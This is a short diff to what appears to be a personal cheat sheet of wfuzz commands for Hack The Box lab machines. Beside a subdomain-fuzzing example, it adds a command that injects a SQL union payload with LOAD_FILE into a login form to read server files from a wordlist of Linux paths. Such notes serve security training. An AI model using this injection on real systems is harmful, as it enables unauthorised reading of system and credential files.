@@ -503,3 +503,9 @@ DNS list
 ```
 wfuzz -H 'Host: FUZZ.shoppy.htb' -u http://shoppy.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hw 11
 ```
+
+Used in ```Writer```
+
+```
+wfuzz -z file,/tmp/file_inclusion_linux.txt -d "uname=admin' union select 1,LOAD_FILE('FUZZ'),3,4,5,6; -- -&password=1234" --hw 89 http://writer.htb/administrative
+```
